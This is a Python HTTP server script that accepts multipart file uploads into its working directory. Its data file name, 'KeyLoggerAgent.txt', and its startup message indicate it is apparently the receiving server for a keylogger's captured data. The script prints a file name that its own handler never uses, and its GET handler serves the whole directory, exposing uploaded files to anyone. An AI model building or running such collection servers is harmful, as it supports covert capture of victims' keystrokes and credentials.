import http.server
import socketserver
import json
import cgi
import os

PORT = 8000
DATA_FILENAME = "KeyLoggerAgent.txt"
UPLOAD_DIR = "./"

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )

            if "file" in form:
                file_item = form["file"]

                if file_item.filename:
                    os.makedirs(UPLOAD_DIR, exist_ok=True)

                    file_path = os.path.join(UPLOAD_DIR, os.path.basename(file_item.filename))

                    with open(file_path, 'wb') as output_file:
                        output_file.write(file_item.file.read())

                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(f"File '{file_item.filename}' uploaded successfully!".encode('utf-8'))
                    return
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"No file uploaded.")
                    return

        self.send_response(400)
        self.end_headers()
        self.wfile.write(b"Invalid request. Expected multipart/form-data.")

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Python Server Running</h1><p>Send a POST request to save data.</p></body></html>")
        else:
            super().do_GET()

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Serving at port {PORT}")
    print(f"Data will be saved to '{DATA_FILENAME}' in the current directory.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:print("\nServer stopped.")